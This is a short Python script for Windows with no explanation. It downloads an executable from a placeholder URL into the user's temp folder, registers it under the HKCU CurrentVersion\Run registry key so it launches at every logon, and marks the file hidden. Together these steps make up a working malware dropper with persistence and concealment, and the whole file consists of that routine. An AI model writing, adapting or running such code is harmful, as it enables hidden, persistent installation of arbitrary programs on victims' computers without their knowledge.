import os
import requests
import shutil
import winreg
import ctypes

# URL of the file you want to download
file_url = "https://example.com/path/to/your/file.exe"

# Local path to save the downloaded file in the temp directory
temp_dir = os.path.join(os.getenv('TEMP'), 'MyTempFolder')
os.makedirs(temp_dir, exist_ok=True)
downloaded_file_path = os.path.join(temp_dir, 'file.exe')

def download_file(url, destination):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(destination, 'wb') as f:
            response.raw.decode_content = True
            shutil.copyfileobj(response.raw, f)
    else:
        print(f"Failed to download the file from {url}")

def add_registry_entry(key, name, value):
    try:
        reg_key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(reg_key, key_path, 0, winreg.KEY_WRITE) as registry_key:
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            print("Registry entry added successfully.")
    except Exception as e:
        print(f"Failed to add registry entry: {e}")

def hide_file(file_path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # 2 represents the "hidden" attribute
        print("File hidden successfully.")
    except Exception as e:
        print(f"Failed to hide file: {e}")

if __name__ == "__main__":
    download_file(file_url, downloaded_file_path)
    if os.path.exists(downloaded_file_path):
        add_registry_entry("MyStartupApp", "MyApp", downloaded_file_path)
        hide_file(downloaded_file_path)
    else:
        print("Downloaded file not found.")
